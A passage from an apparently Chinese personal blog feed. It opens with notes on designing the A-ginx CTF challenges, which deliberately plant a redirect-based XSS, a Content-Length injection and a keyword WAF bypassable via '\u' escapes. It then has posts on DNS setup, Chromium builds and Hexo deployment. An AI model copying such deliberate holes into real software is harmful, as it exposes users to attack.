title="“迫真”的缓存cache"></a>“迫真”的缓存cache</h2><p><a href="https://github.com/kur4ge/my-ctf-challenges/blob/b287a994400fdd4c28d25e20c78f6c49b46a942e/ByteCTF2021/A-ginx/a-ginx/cmd/server/main.go#L42-L55">ByteCTF2021&#x2F;A-ginx&#x2F;a-ginx&#x2F;cmd&#x2F;server&#x2F;main.go#L42-L55</a></p><p>按照正常逻辑应该不需要这种诡异的判断，但是还是考虑到避免搅屎，加上了这段判断。</p><h2 id="backend使用中间件来完成-跳转"><a href="#backend使用中间件来完成-跳转" class="headerlink" title="backend使用中间件来完成../跳转"></a>backend使用中间件来完成<code>../</code>跳转</h2><p><code>../</code>导致的目录穿越其实是一个很经典的问题，可以看到 <a href="http://golang.org/x/net/http2">golang.org&#x2F;x&#x2F;net&#x2F;http2</a> 会自动的进行重定向，而 <a href="http://github.com/gin-gonic/gin">github.com&#x2F;gin-gonic&#x2F;gin</a> 却不能。</p><p><a href="https://github.com/kur4ge/my-ctf-challenges/blob/6827b69b07f4483d2e9cff9c3f72c69b8146304f/ByteCTF2021/A-ginx2/backend/internal/handler/middleware/uri_trim.go#L13-L33">ByteCTF2021&#x2F;A-ginx2&#x2F;backend&#x2F;internal&#x2F;handler&#x2F;middleware&#x2F;uri_trim.go#L13-L33</a></p><p>为了满足跳转造成的XSS，只能手动写一个中间件了～</p><h2 id="修改源码来允许非法Content-Length"><a href="#修改源码来允许非法Content-Length" class="headerlink" title="修改源码来允许非法Content-Length"></a>修改源码来允许非法Content-Length</h2><p><a href="https://github.com/kur4ge/my-ctf-challenges/blob/6827b69b07f4483d2e9cff9c3f72c69b8146304f/ByteCTF2021/A-ginx2/Dockerfile_aginx#L16">ByteCTF2021&#x2F;A-ginx2&#x2F;Dockerfile_aginx#L16</a></p><p>A-ginx2 中导致请求走势的注入点为<code>Content-Length</code>，但事实上使用<a href="http://golang.org/x/net/http2">golang.org&#x2F;x&#x2F;net&#x2F;http2</a>构建的HTTP&#x2F;2服务会针对<code>Content- Length</code>错误抛出一个异常。并且清空body中的数据。所以为了题目的漏洞能够正确的触发，所以只能进行小小的修改了：）</p><h2 id="WAF问题"><a href="#WAF问题" class="headerlink" title="WAF问题"></a>WAF问题</h2><p>WAF就随便写了一个基于关键词WAF，是偷懒了（</p><p>具体的关键词是取自MySQL 8.0 docs中的所有<a href="https://dev.mysql.com/doc/refman/8.0/en/keywords.html#keywords-8-0-detailed-A">keywords</a>，剔除了部分单词，例如or（author），让逻辑可以正确运行。而且，这个waf其实可以用 <code>\u</code>直接绕过（该死的log4j，让我没时间修这个） ，但是似乎，也没人用这个方案绕waf？</p><div align=center><p><img src="https://kur4ge.oss-accelerate.aliyuncs.com/2021/12/A-ginx-idea-and-writeup/-16394027713109.gif?x-oss-process=style/w200"></p></div><h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1><p>希望大家能从这两题中有所收获～</p><div align=center><p><img src="https://kur4ge.oss-accelerate.aliyuncs.com/2021/12/A-ginx-idea-and-writeup/-163940277131010.gif"></p></div>]]></content>
    
    
    <summary type="html">&lt;p&gt;在本次ByteCTF的初赛和决赛中，A-ginx都是比较少解出的题目（是我脑洞太大了吗？感觉不难呀）&lt;/p&gt;
&lt;p&gt;这里我来谈谈我出A-ginx的思路。&lt;/p&gt;
&lt;p&gt;一道题目，需要有若干个漏洞结合而成。我认为一个好的题目，不能随意的把各个漏洞点强制的嵌套起来，应该是符合逻辑，有所取舍的。&lt;/p&gt;
&lt;div align=center&gt;

&lt;p&gt;&lt;img src=&quot;https://kur4ge.oss-accelerate.aliyuncs.com/2021/12/A-ginx-idea-and-writeup/-163940277131011.gif&quot;&gt;&lt;/p&gt;
&lt;/div&gt;</summary>
    
    
    
    <category term="CTF" scheme="https://blog.kur4ge.com/categories/CTF/"/>
    
    
  </entry>
  
  <entry>
    <title>为什么我的百度访问这么慢？？？</title>
    <link href="https://blog.kur4ge.com/2021/11/Why-is-Baidu-so-slow/"/>
    <id>https://blog.kur4ge.com/2021/11/Why-is-Baidu-so-slow/</id>
    <published>2021-11-06T14:03:58.000Z</published>
    <updated>2021-11-06T06:03:58.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="启"><a href="#启" class="headerlink" title="启"></a>启</h1><p>由于国内DNS对于某些域名会进行劫持，所以前段时间我把DNS配置到<code>8.8.8.8</code>。 之后我的网络百度等一些国内站点就变得非常的慢。</p><h1 id="Pi-Hole"><a href="#Pi-Hole" class="headerlink" title="Pi-Hole"></a>Pi-Hole</h1><p>之前以为是DNS设为谷歌DNS ，由于网络距离，导致DNS请求非常慢。所以拿了一个树莓派，使用<a href="https://github.com/pi-hole/pi-hole">Pi-hole</a>自建了一个DNS服务器，希望使用缓存来增加体验。</p><p><img src="https://kur4ge.oss-accelerate.aliyuncs.com/2021/11/Why-is-Baidu-so-slow/image-20211106151234971.png" alt="Pi-hole DNS 配置"></p><p>但是没什么用，访问百度依然很慢，因为后面事情多了，也忍下去了。</p><h1 id="发现问题"><a href="#发现问题" class="headerlink" title="发现问题"></a>发现问题</h1><p>某次我查询百度IP的时候，惊奇的发现，这个IP居然是香港的???</p><span id="more"></span><p><img src="https://kur4ge.oss-accelerate.aliyuncs.com/2021/11/Why-is-Baidu-so-slow/image-20211106153832433.png" alt="百度DNS解析"></p><p><img src="https://kur4ge.oss-accelerate.aliyuncs.com/2021/11/Why-is-Baidu-so-slow/image-20211106152025276.png" alt="103.235.46.39"></p><p>到这下明白了，使用Google DNS解析百度都会认为<strong>海外用户</strong>访问，从而解析到香港服务器，导致国内访问巨慢。</p><p>那既然发现问题，该怎么解决呢？</p><h1 id="chinadns-ng"><a href="#chinadns-ng" class="headerlink" title="chinadns-ng"></a>chinadns-ng</h1><p><a href="https://github.com/zfl9/chinadns-ng">chinadns-ng</a>，它可以通过域名黑&#x2F;白名单来自定义切换解析DNS，让国内域名通过国内DNS，国外域名通过国外DNS。</p><h2 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/zfl9/chinadns-ng.git</span><br><span class="line"><span class="built_in">cd</span> chinadns-ng</span><br><span class="line"></span><br><span class="line">make</span><br></pre></td></tr></table></figure><h2 id="我的启动参数"><a href="#我的启动参数" class="headerlink" title="我的启动参数"></a>我的启动参数</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">nohup</span> ./chinadns-ng -l 15353 -c <span class="string">&quot;223.5.5.5#53,114.114.114.114#53&quot;</span> -t <span class="string">&quot;8.8.8.8#53,1.1.1.1#53&quot;</span> -m chnlist.txt -g gfwlist.txt -4 chnroute.ipset -6 chnroute6.ipset -p 2 &amp;</span><br></pre></td></tr></table></figure><h2 id="定期重启脚本"><a href="#定期重启脚本" class="headerlink" title="定期重启脚本"></a>定期重启脚本</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">pid=$(ps -fu root | grep chinadns-ng | grep -v grep | awk -F<span class="string">&#x27; &#x27;</span> <span class="string">&#x27;&#123;print $2&#125;&#x27;</span>)</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;restart, pid = <span class="variable">$pid</span>&quot;</span></span><br><span class="line"><span class="keyword">if</span> [ -n <span class="string">&quot;<span class="variable">$pid</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line"><span class="built_in">kill</span> -9 <span class="variable">$pid</span></span><br><span class="line"><span class="built_in">sleep</span> 5</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="built_in">nohup</span> ./chinadns-ng -l 15353 -c <span class="string">&quot;223.5.5.5#53,114.114.114.114#53&quot;</span> -t <span class="string">&quot;8.8.8.8#53,1.1.1.1#53&quot;</span> -m chnlist.txt -g gfwlist.txt -4 chnroute.ipset -6 chnroute6.ipset -p 2 &amp;</span><br></pre></td></tr></table></figure><p>保存为<code>sh</code>脚本，最后加入<code>crontab</code>，即可定时重启</p><h2 id="定期数据更新"><a href="#定期数据更新" class="headerlink" title="定期数据更新"></a>定期数据更新</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 走代理以免更新失败</span></span><br><span class="line"><span class="built_in">export</span> http_proxy=</span><br><span class="line"><span class="built_in">export</span> https_proxy=</span><br><span class="line">./update-chnlist.sh</span><br><span class="line">./update-chnroute.sh</span><br><span class="line">./update-chnroute6.sh</span><br><span class="line">./update-gfwlist.sh</span><br></pre></td></tr></table></figure><p>保存为<code>sh</code>脚本，最后加入<code>crontab</code>，即可定时更新</p><h2 id="配置Pi-Hole"><a href="#配置Pi-Hole" class="headerlink" title="配置Pi-Hole"></a>配置Pi-Hole</h2><p>由于Pi-Hole提供了广告封禁，DNS缓存的功能。所以我还是继续选择使用Pi-hole，修改它的上游DNS服务为 <code>127.0.0.1#15353</code></p><p><img src="https://kur4ge.oss-accelerate.aliyuncs.com/2021/11/Why-is-Baidu-so-slow/image-20211106153523999.png" alt="Pi-hole DNS 配置"></p><p>其他配置均不需要修改。</p><h1 id="终"><a href="#终" class="headerlink" title="终"></a>终</h1><p>最后的解析终于正常了，再访问国内站点终于体验飞一样速度了~</p><p><img src="https://kur4ge.oss-accelerate.aliyuncs.com/2021/11/Why-is-Baidu-so-slow/image-20211106154241060.png" alt="解析"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;启&quot;&gt;&lt;a href=&quot;#启&quot; class=&quot;headerlink&quot; title=&quot;启&quot;&gt;&lt;/a&gt;启&lt;/h1&gt;&lt;p&gt;由于国内DNS对于某些域名会进行劫持，所以前段时间我把DNS配置到&lt;code&gt;8.8.8.8&lt;/code&gt;。 之后我的网络百度等一些国内站点就变得非常的慢。&lt;/p&gt;
&lt;h1 id=&quot;Pi-Hole&quot;&gt;&lt;a href=&quot;#Pi-Hole&quot; class=&quot;headerlink&quot; title=&quot;Pi-Hole&quot;&gt;&lt;/a&gt;Pi-Hole&lt;/h1&gt;&lt;p&gt;之前以为是DNS设为谷歌DNS ，由于网络距离，导致DNS请求非常慢。所以拿了一个树莓派，使用&lt;a href=&quot;https://github.com/pi-hole/pi-hole&quot;&gt;Pi-hole&lt;/a&gt;自建了一个DNS服务器，希望使用缓存来增加体验。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://kur4ge.oss-accelerate.aliyuncs.com/2021/11/Why-is-Baidu-so-slow/image-20211106151234971.png&quot; alt=&quot;Pi-hole DNS 配置&quot;&gt;&lt;/p&gt;
&lt;p&gt;但是没什么用，访问百度依然很慢，因为后面事情多了，也忍下去了。&lt;/p&gt;
&lt;h1 id=&quot;发现问题&quot;&gt;&lt;a href=&quot;#发现问题&quot; class=&quot;headerlink&quot; title=&quot;发现问题&quot;&gt;&lt;/a&gt;发现问题&lt;/h1&gt;&lt;p&gt;某次我查询百度IP的时候，惊奇的发现，这个IP居然是香港的???&lt;/p&gt;</summary>
    
    
    
    <category term="破事水" scheme="https://blog.kur4ge.com/categories/%E7%A0%B4%E4%BA%8B%E6%B0%B4/"/>
    
    
    <category term="DNS" scheme="https://blog.kur4ge.com/tags/DNS/"/>
    
  </entry>
  
  <entry>
    <title>Chromium 编译的那些坑</title>
    <link href="https://blog.kur4ge.com/2021/11/chromium-build/"/>
    <id>https://blog.kur4ge.com/2021/11/chromium-build/</id>
    <published>2021-11-02T14:49:14.000Z</published>
    <updated>2021-11-02T06:49:14.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="启"><a href="#启" class="headerlink" title="启"></a>启</h1><p>尝试接触一下Chromium，第一步一定是编译一版属于自己的Chromium。<br>官方文档 <a href="https://chromium.googlesource.com/chromium/src/+/refs/heads/main/docs/get_the_code.md">Get the code: check out, build, and run Chromium</a> 里面的的教程非常详细，一步一步操作就好了。</p><p>注意，大多数资源都无法国内无法访问 <code>:D</code></p><h1 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h1><span id="more"></span><h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><p><code>Windows</code>通过设置<code>HTTP_PROXY</code>效果并不好，我使用了全局VPN<del>（某海豹）</del>来进行数据的下载</p><h3 id="Windows-10-SDK"><a href="#Windows-10-SDK" class="headerlink" title="Windows 10 SDK"></a>Windows 10 SDK</h3><p>下载过程比较稳定，没遇到什么问题在初始化时候遇到缺少<code>Windows 10 SDK</code> 报错如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ gn gen out/Default</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;D:/Code/chromium/src/build/vs_toolchain.py&quot;, line 573, in &lt;module&gt;</span><br><span class="line">    sys.exit(main())</span><br><span class="line">  File &quot;D:/Code/chromium/src/build/vs_toolchain.py&quot;, line 569, in main</span><br><span class="line">    return commands[sys.argv[1]](*sys.argv[2:])</span><br><span class="line">  File &quot;D:/Code/chromium/src/build/vs_toolchain.py&quot;, line 400, in CopyDlls</span><br><span class="line">    _CopyDebugger(target_dir, target_cpu)</span><br><span class="line">  File &quot;D:/Code/chromium/src/build/vs_toolchain.py&quot;, line 433, in _CopyDebugger</span><br><span class="line">    raise Exception(&#x27;%s not found in &quot;%s&quot;\r\nYou must install&#x27;</span><br><span class="line">Exception: dbghelp.dll not found in &quot;C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\dbghelp.dll&quot;</span><br><span class="line">You must installWindows 10 SDK version 10.0.19041.0 including the &quot;Debugging Tools for Windows&quot; feature.</span><br><span class="line">ERROR at //build/toolchain/win/BUILD.gn:55:3: Script returned non-zero exit code.</span><br></pre></td></tr></table></figure><p>那么，下载 <a href="https://developer.microsoft.com/zh-cn/windows/downloads/windows-sdk/">windows-sdk</a> 并安装就可以解决</p><h2 id="参考编译时间"><a href="#参考编译时间" class="headerlink" title="参考编译时间"></a>参考编译时间</h2><p><code>I9-9900KF</code> 64G，大约需要3小时</p><h1 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h1><h2 id="执行人"><a href="#执行人" class="headerlink" title="执行人"></a>执行人</h2><p>教程中需要执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./build/install-build-deps.sh</span><br></pre></td></tr></table></figure><p>记得使用<code>sudo</code>执行，而不是切换到<code>root</code>执行。</p><h2 id="内存盘"><a href="#内存盘" class="headerlink" title="内存盘"></a>内存盘</h2><p>内存盘很好，但是官方提供命令好像有问题？</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mount -t tmpfs -o size=20G,nr_inodes=40k,mode=1777 tmpfs /path/to/out</span><br></pre></td></tr></table></figure><p>上面是官方提供的命令，但是我在编译进程中，总是会出现文件不可写的错误，最终改成</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mount -t tmpfs -o size=20G tmpfs /path/to/out</span><br></pre></td></tr></table></figure><p>问题解决</p><h2 id="无法运行"><a href="#无法运行" class="headerlink" title="无法运行"></a>无法运行</h2><p>虽然编译很快，但是运行就挂了，目前在Debug中…</p><h2 id="参考编译时间-1"><a href="#参考编译时间-1" class="headerlink" title="参考编译时间"></a>参考编译时间</h2><p><code>Intel Xeon Platinum 8260</code> * 2， 768GB，大约需要30分钟。</p><h1 id="MacOS"><a href="#MacOS" class="headerlink" title="MacOS"></a>MacOS</h1><p>MacOS我编译了两次，一次是临时领用（重置过）的一台MBP，一次是我日常使用的MBP</p><p>在领用的电脑按照教程，是毫无问题。但是在本机出现一个坑。</p><h2 id="默认Python不同"><a href="#默认Python不同" class="headerlink" title="默认Python不同"></a>默认Python不同</h2><p><img src="https://kur4ge.oss-accelerate.aliyuncs.com/2021/11/chromium-build/image-20211106155354249.png" alt="不同的python3"></p><p>初始化是需要使用<code>Mac</code>原生<code>Python</code>，使用下面命令临时修改即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export PATH=&quot;/usr/bin:$PATH&quot;</span><br></pre></td></tr></table></figure><h2 id="参考编译时间-2"><a href="#参考编译时间-2" class="headerlink" title="参考编译时间"></a>参考编译时间</h2><p>MacBookPro 2019 I7 16″ 32GB<br>领用机大约需要3小时，日常机大约4小时。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>官方提供的教程是非常详细的，大多数最大的坑可能是网络问题。多搜索，多尝试一定可以解决的~</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;启&quot;&gt;&lt;a href=&quot;#启&quot; class=&quot;headerlink&quot; title=&quot;启&quot;&gt;&lt;/a&gt;启&lt;/h1&gt;&lt;p&gt;尝试接触一下Chromium，第一步一定是编译一版属于自己的Chromium。&lt;br&gt;官方文档 &lt;a href=&quot;https://chromium.googlesource.com/chromium/src/+/refs/heads/main/docs/get_the_code.md&quot;&gt;Get the code: check out, build, and run Chromium&lt;/a&gt; 里面的的教程非常详细，一步一步操作就好了。&lt;/p&gt;
&lt;p&gt;注意，大多数资源都无法国内无法访问 &lt;code&gt;:D&lt;/code&gt;&lt;/p&gt;
&lt;h1 id=&quot;Windows&quot;&gt;&lt;a href=&quot;#Windows&quot; class=&quot;headerlink&quot; title=&quot;Windows&quot;&gt;&lt;/a&gt;Windows&lt;/h1&gt;</summary>
    
    
    
    <category term="尝尝鲜" scheme="https://blog.kur4ge.com/categories/%E5%B0%9D%E5%B0%9D%E9%B2%9C/"/>
    
    
    <category term="Chromium" scheme="https://blog.kur4ge.com/tags/Chromium/"/>
    
  </entry>
  
  <entry>
    <title>我的博客配置</title>
    <link href="https://blog.kur4ge.com/2021/10/my-blog/"/>
    <id>https://blog.kur4ge.com/2021/10/my-blog/</id>
    <published>2021-10-23T01:28:05.000Z</published>
    <updated>2022-03-25T15:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="启"><a href="#启" class="headerlink" title="启"></a>启</h1><p>果然，第一篇肯定要讲一讲自己是如何配置的我的博客。</p><p>从 <code>WordPress</code> 研究到<code> ZBlog</code>，最后还是选了老朋友 <code>Hexo</code> （毕竟可以<code>GitHub Page</code>）</p><span id="more"></span><h1 id="主题选择"><a href="#主题选择" class="headerlink" title="主题选择"></a>主题选择</h1><p>主题想着比较清爽，看的舒服就好了。这里选择了 <a href="https://github.com/ppoffice/hexo-theme-icarus">hexo-theme-icarus</a>。</p><h1 id="基础配置"><a href="#基础配置" class="headerlink" title="基础配置"></a>基础配置</h1><p>由于需要自动化部署，配置、文章、资源数据都需要在存放在<code>GitHub</code>仓库中。</p><p>一共使用四个仓库,分别存放配置、样式、文章&#x2F;资源数据，这些通过<code>git submodule</code>将他们关联起来，还需要一个仓库专门用来存放<code>GitHub Page</code>的数据。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git init</span><br><span class="line">git remote add origin https://github.com/kur4ge/blog.git</span><br><span class="line">git submodule add https://github.com/kur4ge/blog-posts source/_posts</span><br><span class="line">git submodule add https://github.com/kur4ge/hexo-theme-icarus.git themes/icarus</span><br></pre></td></tr></table></figure><p>为了保证每次部署的统一，我fork一份主题（当然也可以使用<code>npm install</code>的方案）</p><p>因为配置中存了<code>accesskey</code> 所以权限是设为私有了：）</p><h1 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h1><h2 id="自动部署-x-Workflow"><a href="#自动部署-x-Workflow" class="headerlink" title="自动部署 x Workflow"></a>自动部署 x Workflow</h2><p><code>Workflow</code> 是 <code>GitHub</code> 推出的自动化流，可以简单的理解能在收到<code>push</code>，<code>pull</code> 等请求后会自动执行一段或多段代码（类似执行<code>docker</code>的<code>build</code>）</p><p>通过简单的配置，就可以自动化的在云端生成并部署博客，这是我的配置：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># This is a basic workflow to help you get started with Actions</span></span><br><span class="line"><span class="attr">name:</span> <span class="string">CI</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Controls when the workflow will run</span></span><br><span class="line"><span class="attr">on:</span></span><br><span class="line">  <span class="comment"># Triggers the workflow on push or pull request events but only for the main branch</span></span><br><span class="line">  <span class="attr">push:</span></span><br><span class="line">    <span class="attr">branches:</span> [ <span class="string">main</span> ]<span class="comment"># 只用 main 被 push 才触发</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Allows you to run this workflow manually from the Actions tab</span></span><br><span class="line">  <span class="attr">workflow_dispatch:</span></span><br><span class="line"><span class="attr">env:</span></span><br><span class="line">  <span class="attr">NODE_VERSION:</span> <span class="string">&#x27;14.18.1&#x27;</span>                <span class="comment"># set this to the node version to use</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># A workflow run is made up of one or more jobs that can run sequentially or in parallel</span></span><br><span class="line"><span class="attr">jobs:</span></span><br><span class="line">  <span class="comment"># This workflow contains a single job called &quot;build&quot;</span></span><br><span class="line">  <span class="attr">build:</span></span><br><span class="line">    <span class="comment"># The type of runner that the job will run on</span></span><br><span class="line">    <span class="attr">runs-on:</span> <span class="string">ubuntu-latest</span><span class="comment"># 初始镜像 FROM ubuntu:latest (bushi)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Steps represent a sequence of tasks that will be executed as part of the job</span></span><br><span class="line">    <span class="attr">steps:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Use</span> <span class="string">Node.js</span> <span class="string">$&#123;&#123;</span> <span class="string">env.NODE_VERSION</span> <span class="string">&#125;&#125;</span><span class="comment"># 构建初始化 node 环境</span></span><br><span class="line">        <span class="attr">uses:</span> <span class="string">actions/setup-node@v2</span></span><br><span class="line">        <span class="attr">with:</span></span><br><span class="line">          <span class="attr">node-version:</span> <span class="string">$&#123;&#123;</span> <span class="string">env.NODE_VERSION</span> <span class="string">&#125;&#125;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Clone</span> <span class="string">blog</span>  <span class="comment"># Clone blog 最新的数据，并且拉取 submodules 数据</span></span><br><span class="line">        <span class="attr">uses:</span> <span class="string">actions/checkout@v2</span></span><br><span class="line">        <span class="attr">with:</span></span><br><span class="line">          <span class="attr">token:</span> <span class="string">$&#123;&#123;</span> <span class="string">secrets.PAT</span> <span class="string">&#125;&#125;</span></span><br><span class="line">          <span class="attr">repository:</span> <span class="string">kur4ge/blog</span></span><br><span class="line">          <span class="attr">submodules:</span> <span class="literal">true</span> </span><br><span class="line">          <span class="attr">fetch-depth:</span> <span class="number">1</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">uses:</span> <span class="string">actions/cache@v2</span>  <span class="comment"># cache node_modules 如果 package-lock.json 没变的话可以大大加速</span></span><br><span class="line">        <span class="attr">with:</span></span><br><span class="line">          <span class="attr">path:</span> <span class="string">node_modules</span></span><br><span class="line">          <span class="attr">key:</span> <span class="string">node_modules-$&#123;&#123;</span> <span class="string">hashFiles(&#x27;**/package-lock.json&#x27;)</span> <span class="string">&#125;&#125;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">npm</span> <span class="string">install</span>  <span class="comment"># 安装依赖</span></span><br><span class="line">        <span class="attr">run:</span> <span class="string">|</span></span><br><span class="line"><span class="string">          npm i hexo-cli &amp;&amp; npm i</span></span><br><span class="line"><span class="string"></span>      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Generate</span> <span class="string">and</span> <span class="string">deploy</span>   <span class="comment"># 生成并部署</span></span><br><span class="line">        <span class="attr">env:</span></span><br><span class="line">          <span class="attr">GITHUB_TOKEN:</span> <span class="string">$&#123;&#123;</span> <span class="string">secrets.PAT</span> <span class="string">&#125;&#125;</span></span><br><span class="line">        <span class="attr">run:</span> <span class="string">|</span></span><br><span class="line"><span class="string">          ./node_modules/.bin/hexo g -d</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure><p>其中需要配置 <code>PAT</code> 在 <a href="https://github.com/settings/tokens">Personal access tokens</a> 生成一个，并配置到 <code>settings/secrets/actions</code> 即可。</p><p>整体耗时如下，可以看出使用了<code>Cache</code>服务，整体能在一分钟内完成部署，效率还是很快的~</p><p><img src="https://kur4ge.oss-accelerate.aliyuncs.com/2021/10/my-blog/image-20211030182817788.png" alt="近几次速度"></p><p><img src="https://kur4ge.oss-accelerate.aliyuncs.com/2021/10/my-blog/image-20211024021057969.png" alt="部署各阶段耗时"></p><h2 id="加速，还是加速！"><a href="#加速，还是加速！" class="headerlink" title="加速，还是加速！"></a>加速，还是加速！</h2><p>服务是部署在<code>GitHub Page</code>上的，美中不足是带宽比较小。为了阅读体验使用CDN来加速资源加载。</p><h3 id="Cloudflare"><a href="#Cloudflare" class="headerlink" title="Cloudflare"></a>Cloudflare</h3><p>本来打算使用阿里云DNS可以控制内外域名解析，使用Gitee作为国内节点（<del>可惜 Gitee 要收费</del>），Github作为国外节点。最后决定使用 <code>Cloudflare</code> 做全站的加速。</p><h3 id="阿里云OSS"><a href="#阿里云OSS" class="headerlink" title="阿里云OSS"></a>阿里云OSS</h3><p>既然要用CDN，那就要把所有的外部资源统统整上<code>CDN</code>。（反正流量也不大，花不了多少钱。<br>这里使用了 <a href="https://github.com/kur4ge/hexo-deployer-cos-cdn">hexo-deployer-cos-cdn</a> 进行魔改，可以自定义跳过部分文件，让<code>CDN</code>仅作为附件的纯净<code>CDN</code>。</p><p>相应使用CDN也需要调整图片路径，这里使用了魔改后的 <a href="https://github.com/kur4ge/hexo-asset-path">hexo-asset-path</a> ，与自己编写的 <a href="https://github.com/kur4ge/hexo-dom-modify">hexo-dom-modify</a> 来修改<code>js</code>、<code>css</code>的地址。</p><h2 id="简洁"><a href="#简洁" class="headerlink" title="简洁"></a>简洁</h2><p>因为图片资源使用了CDN，所以不想图片数据也上传到<code>Github Page</code>中，所以我写了一个部署中间件，<a href="https://github.com/kur4ge/hexo-delete-sth">hexo-delete-sth</a>，可以在部署的流程中，指定删除文件。避免空目录和你不想要的文件进入第二次部署上传。</p><p>所以，这是我的最后部署配置</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">deploy:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">type:</span> <span class="string">delete-sth</span></span><br><span class="line">    <span class="attr">deleteFiles:</span> <span class="comment"># 这两个文件是 icarus 主题带的</span></span><br><span 